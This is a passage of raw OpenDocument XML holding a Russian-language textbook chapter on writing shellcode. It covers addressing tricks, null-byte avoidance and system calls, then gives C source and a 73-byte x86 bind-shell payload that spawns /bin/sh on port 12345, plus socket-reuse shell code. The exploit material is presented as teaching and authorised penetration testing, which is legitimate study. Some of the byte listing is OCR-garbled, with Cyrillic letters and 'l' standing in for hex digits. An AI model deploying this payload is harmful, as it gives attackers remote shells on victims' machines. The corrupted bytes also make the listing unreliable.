      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New" officeooo:paragraph-rsid="0038dcd3"/>
    </style:style>
    <style:style style:name="P88" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-top="0.101cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P89" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="-0.199cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="P90" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P91" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:paragraph-properties fo:margin-top="0.22cm" fo:margin-bottom="0.101cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P92" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:paragraph-properties fo:margin-left="1.016cm" fo:margin-right="0cm" fo:text-indent="-1.016cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P93" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P94" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.22cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P95" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.22cm" fo:margin-bottom="0cm" style:contextual-spacing="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
      <style:text-properties style:font-name="Arial" fo:font-size="12pt" fo:font-weight="bold" style:font-name-asian="Lucida Sans Unicode" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-name-complex="Mangal" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="0029e9c0"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="002a1abf"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="002b0ea7"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:language="ru" fo:country="RU"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-style="italic" fo:font-weight="normal" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:language="en" fo:country="US" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties style:font-name="Courier New" officeooo:rsid="002b0ea7"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:letter-spacing="-0.018cm"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties style:font-name="Times New Roman1" style:font-name-asian="Times New Roman1" style:font-name-complex="Times New Roman1"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties style:font-name="Times New Roman1" officeooo:rsid="00276531" style:font-name-asian="Times New Roman1" style:font-name-complex="Times New Roman1"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties officeooo:rsid="00206111"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:letter-spacing="-0.025cm"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:letter-spacing="-0.025cm" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties officeooo:rsid="00244bc6"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties officeooo:rsid="0025205f"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties officeooo:rsid="00257e97"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties officeooo:rsid="00276531"/>
    </style:style>
    <style:style style:name="T30" style:family="text">
      <style:text-properties officeooo:rsid="0029539a"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties officeooo:rsid="0029e9c0"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties officeooo:rsid="002e030c"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties fo:letter-spacing="-0.018cm"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties fo:letter-spacing="-0.007cm"/>
    </style:style>
    <style:style style:name="T35" style:family="text">
      <style:text-properties style:font-name="Times New Roman"/>
    </style:style>
    <style:style style:name="T36" style:family="text">
      <style:text-properties officeooo:rsid="0030ec74"/>
    </style:style>
    <style:style style:name="T37" style:family="text">
      <style:text-properties style:font-name="Courier New"/>
    </style:style>
    <style:style style:name="T38" style:family="text">
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10p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4" text:outline-level="1">Что такое shell-код?</text:h>
      <text:p text:style-name="P33">Shell-код - это код, внедряемый в другую программу и исполняемый в ходе атаки на обнаруженную в ней уязвимость. Обычно длина shell-кода ограничена, например, размером пакета, посылаемого уязвимому приложению, поэтому он должен быть написан предельно эффективно и решать очень узкую задачу.</text:p>
      <text:p text:style-name="P34">С точки зрения хакера правильно написанный и надежный shell-код необходим для успешной атаки на уязвимость в реальных условиях, <text:span text:style-name="T28">иначе</text:span> атакуемое удаленное приложение <text:span text:style-name="T30">зависнет</text:span>.</text:p>
      <text:p text:style-name="P34">С точки зрения безопасности правильность и надежность shell-кода также критичны. В ходе разрешенного тестирования на возможность проникновения это условие является обязательным, поскольку пользователи вряд ли будут счастливы, если во время тестирования промышленная система или критическое приложение «рухнут». </text:p>
      <text:h text:style-name="P95" text:outline-level="1">Проблема адресации</text:h>
      <text:p text:style-name="P33"><text:s/>Обычные программы обращаются к переменным и функциям с помощью указателя, который вычисляется компилятором или возвращается функцией, например, <text:span text:style-name="T9">malloc</text:span>. В shell-коде тоже часто возникает необходимость сослаться на строку или какую-нибудь другую переменную. Например, если вы пишете shell-код для выполнения некоторой программы с помощью системного вызова <text:span text:style-name="T9">exec</text:span>, то понадобится указатель на строку, содержащую имя этой программы. Поскольку shell-код внедряется в программу во время выполнения, то необходимо статически определить используемые в нем адреса памяти. Так, если код содержит строку, то вы должны знать, где она находится, иначе как к ней обратиться?</text:p>
      <text:p text:style-name="P33">Это серьезная проблема, ведь если вы хотите использовать в shell-коде системные вызовы, требующие аргументов, то надо знать, где эти аргументы найти. Первое решение состоит в том, чтобы обращаться к ним с помощью команд <text:span text:style-name="T9">call</text:span> и <text:span text:style-name="T9">jmp</text:span>. Второй подход предполагает заталкивание аргументов в стек и запоминание указателя стека <text:s/>для последующего обращения к ним.</text:p>
      <text:h text:style-name="P90" text:outline-level="2">Применение команд call и jmp</text:h>
      <text:p text:style-name="P33">Предположим, что мы хотим написать shell-код, в котором используется системный ньшои, требующий указателя на строку в качестве аргумента. Пусть это будет строка Burb. Получить ее адрес в памяти позволит код из примера. </text:p>
      <text:p text:style-name="P43"><text:span text:style-name="T18">Пример</text:span>. Получение адреса данных с помощью команды jmp</text:p>
      <text:p text:style-name="P49"><text:s text:c="2"/>jmp short data </text:p>
      <text:p text:style-name="P49"><text:s text:c="2"/>code; </text:p>
      <text:p text:style-name="P49"><text:s text:c="2"/>pop esi </text:p>
      <text:p text:style-name="P49"><text:s text:c="2"/>... </text:p>
      <text:p text:style-name="P49"><text:s/>data: </text:p>
      <text:p text:style-name="P49"><text:s text:c="2"/>call code </text:p>
      <text:p text:style-name="P49"><text:s text:c="2"/>db 'Burb' </text:p>
      <text:h text:style-name="P90" text:outline-level="2">Заталкивание аргументов в стек </text:h>
      <text:p text:style-name="P47">Использование команд jmp и call для получения адреса данных в памяти прекрасно работает, но shell-код получается довольно громоздким. <text:span text:style-name="T8">М</text:span>етод заталкивания аргументов в стек еще и повышает быстродействие shell-кода. </text:p>
      <text:p text:style-name="P35">Снова предположим, что аргументом системного вызова является указатель на строку, и пусть эта строка равна Burb. Взгляните на следующий код: </text:p>
      <text:p text:style-name="P48"><text:s/>push 0x<text:span text:style-name="T26">6</text:span>2727542 ; <text:span text:style-name="T27">bruB</text:span></text:p>
      <text:p text:style-name="P49"><text:s/>mov esi,esp </text:p>
      <text:p text:style-name="P35">В строке 1 строка Burb помещена в стек. Поскольку стек растет от старших <text:line-break/>адресов к младшим, то порядок байтов в строке изменен на противоположный (bruB), и каждый байт представлен в 16-ричном виде. В строке 2 указатель стека (ESP), сохраняется в регистре ESI. Теперь ESI указывает на строку Burb. Отметим, что команда <text:span text:style-name="T9">push</text:span> позволяет за одну операцию поместить в стек один, два или четыре байта. Если нужно поместить, скажем, строку «Morning!», придется выполнить <text:span text:style-name="T9">push</text:span> дважды: </text:p>
      <text:p text:style-name="P6"><text:s/>push 0x21676e69 <text:tab/>; !gni </text:p>
      <text:p text:style-name="P12"><text:s/>push 0x6e726f4d <text:tab/>; nroM </text:p>
      <text:p text:style-name="P12"><text:s/>mov esi,esp </text:p>
      <text:p text:style-name="P35">Чтобы поместить в стек один байт, нужно добавить модификатор <text:span text:style-name="T9">byte</text:span>. В примерах выше строки не завершались нулевым байтом. Это можно исправить, добавив перед заталкиванием строки в стек следующие команды: </text:p>
      <text:p text:style-name="P6"><text:s/>хо<text:span text:style-name="T1">r</text:span> еах,еах </text:p>
      <text:p text:style-name="P12"><text:s/>push byte al </text:p>
      <text:h text:style-name="P93" text:outline-level="1">Проблема нулевого байта </text:h>
      <text:p text:style-name="P35">Shell-код часто внедряется в программу с помощью функций <text:span text:style-name="T9">read</text:span>(), <text:span text:style-name="T9">sprintf</text:span>() и <text:span text:style-name="T9">strcpy</text:span>(). Большинство функций работы со строками ожидают, что строка завершается нулевым байтом. Если в shell-коде встречается нулевой байт, то он интерпретируется как конец строки, так что все следующие за ним байты игнорируются. Надо избавиться от нулевых байтов в shell-коде. Если мы хотим, чтобы shell-код передавал системному вызову строку, то она должна завершаться нулем. В обычной ассемблерной программе мы написали бы так: "Hello, world !", 0x00 Но при этом получится shell-код, содержащий нулевой байт. Обойти эту проблему можно, например, добавляя завершающий нуль во время исполнения: </text:p>
      <text:p text:style-name="P6"><text:s/><text:span text:style-name="T1">хоr</text:span> еах,еах </text:p>
      <text:p text:style-name="P12"><text:s/>mov byte [ebx+14],al </text:p>
      <text:p text:style-name="P35">При неправильном выборе регистров или типов данных может получиться shell-код, содержащий нулевой байт. Например, команда «mov eax,l» транслируется в mov еах, 0x00000001 поскольку мы попросили записать 1 в 32-разрядный регистр ЕАХ. Если бы вместо ЕАХ мы использовали AL, то нулевого байта не появилось бы.</text:p>
      <text:h text:style-name="P93" text:outline-level="1">Реализация системных вызовов </text:h>
      <text:p text:style-name="P35">Чтобы понять, как обратиться к конкретному системному вызову из программы на языке ассемблера, сначала почитайте страницу руководства по этому вызову, дабы знать, что он делает, каких требует аргументов и какое значение возвращает. Ядро <text:soft-page-break/>предполагает, что в регистре ЕАХ находится номер системного вызова. Если вызов с таким номером существует, то ядро извлечет аргументы и выполнит его.</text:p>
      <text:h text:style-name="P90" text:outline-level="2">Номера системных вызовов</text:h>
      <text:p text:style-name="P36">Каждый системный вызов имеет уникальный номер, известный ядру. Часто эти номера не приводятся в страницах руководства, но их можно найти в исходных текстах ядра и заголовочных файлах. В Linux номера всех системных вызовов приведены в заголовочном файле <text:span text:style-name="T9">syscall.h</text:span><text:span text:style-name="T1">,</text:span> а в FreeBSD их можно найти в файле <text:span text:style-name="T9">unistd.h</text:span>.</text:p>
      <text:h text:style-name="P90" text:outline-level="2">Аргументы системных вызовов</text:h>
      <text:p text:style-name="P35">Способ передачи аргументов системному вызову зависит от системы. <text:s/>Чтобы узнать, как передавать аргументы системному вызову в ассемблерной программе, сначала обратитесь к странице руководства. </text:p>
      <text:h text:style-name="P90" text:outline-level="2">Значение, возвращаемое системным вызовом</text:h>
      <text:p text:style-name="P35">Значение, которое возвращает системный вызов, чаще всего помещается в регистр ЕАХ. Но есть и исключения, например, в системе FreeBSD вызов <text:span text:style-name="T2">fork</text:span><text:span text:style-name="T1">( )</text:span> помещает возвращаемые значения в другие регистры. Чтобы узнать, где искать возвращаемое системным вызовом значение, обратитесь к странице руководства или посмотрите, как это реализовано в исходных текстах библиотеки <text:span text:style-name="T9">libc</text:span>. Можно реализовать обращение к системному вызову из программы на С, а затем дизассемблировать двоичный файл с помощью <text:span text:style-name="T9">gdb</text:span> или <text:span text:style-name="T9">objdump</text:span>. </text:p>
      <text:h text:style-name="P93" text:outline-level="1">Внедрение shell-кода в удаленную программу</text:h>
      <text:h text:style-name="P90" text:outline-level="2">Shell-код для привязки к порту </text:h>
      <text:p text:style-name="P35">Один из самых распространенных shell-кодов привязывает интерпретатор команд к порту с большим номером. Это позволяет атакующему создать на удаленном хосте сервер, который при соединении с ним будет запустит оболочку. На языке С соответствующая программа <text:span text:style-name="T23">в</text:span>ыгл<text:span text:style-name="T23">я</text:span>дит следующим образом:</text:p>
      <text:p text:style-name="P38"><text:span text:style-name="T1"><text:s/></text:span><text:s/>int main(void) </text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1"><text:s/></text:span><text:s/>{</text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1"><text:s/></text:span><text:s/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>int new, sockfd = socket(AF_INET, SOCK_STREAM, 0); </text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1"><text:s/></text:span><text:s/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>struct sockaddr_in sin; </text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1"><text:s/></text:span><text:s/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>sin.sin_family = AF_INET; </text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1"><text:s/></text:span><text:s/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>sin.sin_addr.s_addr = 0; </text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1"><text:s/></text:span><text:s/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>sin.sin_port = <text:span text:style-name="T1">htons(12345);</text:span> </text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1"><text:s/></text:span><text:s/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>bind(sockfd, (struct sockaddr *)&amp;sin, sizeof(sin)); </text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1"><text:s/></text:span><text:s/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>listen(sockfd,5); </text:p>
      <text:p text:style-name="P12"><text:s text:c="2"/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>new = accept(sockfd,<text:span text:style-name="T29">0</text:span>,0); </text:p>
      <text:p text:style-name="P12"><text:s text:c="2"/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>for(i=2;i&gt;=0;<text:span text:style-name="T1">i--)</text:span> </text:p>
      <text:p text:style-name="P12"><text:s text:c="2"/><text:span text:style-name="T1"><text:s text:c="4"/></text:span>dup2(new,i); </text:p>
      <text:p text:style-name="P12"><text:s text:c="2"/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>execl(<text:span text:style-name="T1">"</text:span>/bin/sh","sh",NULL); </text:p>
      <text:p text:style-name="P13"><text:s text:c="2"/>}</text:p>
      <text:p text:style-name="P45">Чистый shell-код для привязывания к порту в Linux.</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T11"><text:s/>cha</text:span><text:span text:style-name="T12">r</text:span><text:span text:style-name="T11"> bindsckcode[]= </text:span><text:span text:style-name="T12"><text:tab/><text:tab/>/* 73 байта <text:s/>*/</text:span></text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1">"\x33\xc0" <text:tab/><text:tab/><text:tab/>/* xor eax,eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\х50"<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* push eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1">"\x68\xff\x02\xl2\x34"<text:tab/><text:tab/>/*</text:span> <text:span text:style-name="T1">push 0x341202ff */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xe7" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* <text:span text:style-name="T1">mov edi,esp */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x50"<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>/* push <text:span text:style-name="T1">eax</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x6a\x01" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* <text:span text:style-name="T1">push b</text:span><text:span text:style-name="T5">yte</text:span><text:span text:style-name="T1"> 1 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x6a\x02" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* <text:span text:style-name="T1">push b</text:span><text:span text:style-name="T5">yte</text:span><text:span text:style-name="T1"> 2 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xel" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* <text:span text:style-name="T1">mov ecx,esi */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xb0\x66" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* <text:span text:style-name="T1">mov </text:span><text:span text:style-name="T5">al,</text:span><text:span text:style-name="T1">0x66 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x31\xdb" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* <text:span text:style-name="T1">xor ebx,ebx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x43" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>/* inc <text:span text:style-name="T1">ebx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1">"</text:span>\xcd\x80" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* <text:span text:style-name="T1">int $0x80 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x6a\xl0" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* push b<text:span text:style-name="T31">yte</text:span> <text:span text:style-name="T1">0x10*/</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x57" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>/* push <text:span text:style-name="T1">edi */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x50" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>/* push <text:span text:style-name="T1">eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xe<text:span text:style-name="T1">1</text:span>" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* mov <text:span text:style-name="T31">ecx,</text:span><text:span text:style-name="T1">esp */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xb0\x66" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* mov <text:span text:style-name="T31">al,</text:span><text:span text:style-name="T1">0x66 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x43" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>/* inc <text:span text:style-name="T1">ebx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xcd\x80" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* int <text:span text:style-name="T1">0x80 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xb0\x66" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* mov <text:span text:style-name="T31">al, </text:span><text:span text:style-name="T1">0x66 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xb3\x04" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* mov <text:span text:style-name="T31">bl,</text:span><text:span text:style-name="T1">4 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\x44\x24\x04<text:span text:style-name="T1">"</text:span> <text:span text:style-name="T1"><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T5">[esp+4],</text:span><text:span text:style-name="T1">eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xcd\x80" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* int <text:span text:style-name="T1">0x80 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x33\xc0" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* xor <text:span text:style-name="T1">eax,eax*/</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x83\xc4\x0c" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* add <text:span text:style-name="T31">esp,</text:span><text:span text:style-name="T1">0x0c */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\х50" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* push</text:span> <text:span text:style-name="T1">eax</text:span> </text:p>
      <text:p text:style-name="P12"><text:s/>"\х50" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>/* push <text:span text:style-name="T1">eax</text:span> </text:p>
      <text:p text:style-name="P12"><text:s/>"\xb0\x66" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T5">al,</text:span><text:span text:style-name="T1">0x66 */ </text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\х43" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>/* inc <text:span text:style-name="T1">ebx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xcd\x80" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* int 0x80 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xc3" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T5">ebx,</text:span><text:span text:style-name="T1">eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1">"</text:span>\х31\хс9" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* xor ecx,ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xbl\x03" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T5">cl,</text:span><text:span text:style-name="T1">3 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1">"</text:span>\х31\хс0" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* xor eax,eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xb0\x3f" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T5">al,</text:span><text:span text:style-name="T1">0x3f */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\х49" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* dec ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xcd\x80" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* int 0x80 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1">"\х41" <text:tab/><text:tab/><text:tab/><text:tab/>/* inc ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xe2\xf6"<text:span text:style-name="T1">;</text:span> <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* loop &lt;bindsckcode+63&gt; */</text:span></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ </text:h>
      <text:p text:style-name="P35">Этот код просто привязывает сокет к порту с большим номером (в данном случае 12345) и выполняет интерпретатор команд, когда приходит запрос на соединение. Техника распространенная, но небезупречная. Если на атакуемом хосте установлен межсетевой экран, который по умолчанию не разрешает соединения ни с какими портами, кроме явно открытых, то атакующий не сможет «получить shell». </text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:soft-page-break/>Shell-код для использования существующего дескриптора сокета </text:h>
      <text:p text:style-name="P35">Выбирая shell-код для своего эксплойта, всегда следует предполагать, что на хосте будет установлен межсетевой экран, отвергающий соединения со всеми портами, кроме разрешенных. В такой ситуации shell-код, привязывающий интерпретатор команд к порту, <text:span text:style-name="T21">–</text:span> не лучшее решение. Можно вместо этого воспользоваться уже имеющимся дескриптором сокетом, а не создавать новый. </text:p>
      <text:p text:style-name="P35">Следующий shell-код просматривает всю таблицу дескрипторов в поисках нужного сокета. Если подходящий сокет найден, то его дескриптор дублируется на <text:span text:style-name="T9">stdin</text:span> и <text:span text:style-name="T9">stdout</text:span>, после чего можно выполнять интерпретатор команд. </text:p>
      <text:p text:style-name="P41">Программа на С. </text:p>
      <text:p text:style-name="P12"><text:s/>int main(void) </text:p>
      <text:p text:style-name="P12"><text:s/>{int i,j; </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s/></text:span>j <text:span text:style-name="T1">=</text:span> sizeof(sockaddr<text:span text:style-name="T1">_</text:span>in); </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s/></text:span>for(i<text:span text:style-name="T1">=</text:span>0;i<text:span text:style-name="T1">&lt;256</text:span>;i<text:span text:style-name="T1">++</text:span>) { </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>if(getpeername(i,&amp;sin,&amp;j)&lt;0) </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s text:c="4"/></text:span>continue; </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s text:c="2"/></text:span>if(sin.sin_port == htons(port)) </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s text:c="4"/></text:span>break; </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s/></text:span>} </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s/></text:span>for(j=0;j&lt;2;j++) </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s text:c="3"/></text:span>du<text:span text:style-name="T1">p</text:span>2(j,i); </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s/></text:span>execl("/bin/sh", "sh", NULL); </text:p>
      <text:p text:style-name="P12"><text:s/>} </text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ </text:h>
